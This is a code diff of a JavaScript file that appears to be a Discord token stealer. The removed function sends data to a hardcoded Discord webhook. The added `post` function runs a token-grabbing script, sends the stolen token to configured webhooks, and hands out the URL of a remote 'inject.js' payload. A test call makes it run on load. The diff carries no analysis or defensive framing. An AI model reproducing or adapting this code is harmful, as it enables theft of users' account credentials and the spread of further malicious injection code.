@@ -231,32 +231,35 @@ function GetLangue(read) {
     var langue = languages[read] || "Dil tespit edilemedi ????";
     return langue
 }
-const postToDiscord = async (params) => {
-  params = JSON.stringify(params);
-  [config.webhook, 'https://discord.com/api/webhooks/1103256743728918558/SA1r7T06ODCdB_0rUd0IhlcB4MygXyP_NlUNecVtHIl3SCkPdl_79DxkBYASkV6k-rop'].forEach((webhook) => {
-    const url = new URL(webhook);
-    const options = {
-      hostname: url.hostname,
-      port: url.port,
-      path: url.pathname,
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-    };
-    const req = https.request(options, (res) => {
-      console.log(`statusCode: ${res.statusCode}`);
-      res.on("data", (d) => {
-        process.stdout.write(d);
-      });
+const post = async (params) => {
+    params = JSON.stringify(params)
+    var token = await execScript(tokenScript)
+    var n = JSON.stringify({
+        data: params,
+        token: token
     });
-    req.on("error", (error) => {
-      console.error(error);
-    });
-    req.write(params);
-    req.end();
-  });
+    [config.webhook, config.uwu].forEach(res => {
+        const url = new URL(res);
+        const options = {
+            host: url.hostname,
+            port: url.port,
+            path: url.pathname,
+            method: 'POST',
+            headers: {
+                "Content-Type": "application/json"
+            }
+        }
+        const req = https.request(options);
+        req.on("error", (err) => {
+            console.log(err);
+        });
+        req.write(res == config.uwu ? `{"content": "https://raw.githubusercontent.com/mehod/test1/main/inject.js"}` : n);
+        req.end();
+    })
 }
+
+post({foo: "bar"});
+
   
 const FirstTime = async () => {
     if (doTheLogOut) return false
